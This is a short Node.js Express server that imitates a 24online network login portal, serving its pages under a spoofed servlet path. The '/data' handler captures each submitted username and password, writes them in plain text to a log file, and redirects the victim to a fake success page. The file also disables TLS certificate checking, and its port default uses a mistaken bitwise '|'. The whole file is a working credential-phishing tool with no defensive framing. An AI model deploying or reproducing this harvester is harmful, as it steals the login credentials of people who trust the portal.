const express = require('express');
const fs = require('fs');
const axios = require('axios');
const bodyParser = require('body-parser');
const hbs = require('express-handlebars').create();

const PORT = process.argv[2] | 3000
const app = express();

app.engine('handlebars', hbs.engine);
app.set('view engine', 'handlebars');

app.use(bodyParser.urlencoded({ extended: true }));

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

app.use('/24online/servlet/E24onlineHTTPClient', express.static('static'));

app.get('/', (req, res) => {
    res.redirect('/24online/servlet/E24onlineHTTPClient')
})

app.post('/data', async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    fs.appendFile('data.log', `${username}:${password}\n`, function (err) {
        if (err) throw err;
    });
    // Arrrghhhhhhh I will continue tomorrow.
    res.redirect('/24online/servlet/E24onlineHTTPClient/logged.html')
})

app.listen(PORT, () => {
    console.log(`server started on port http://localhost:${PORT}`);
})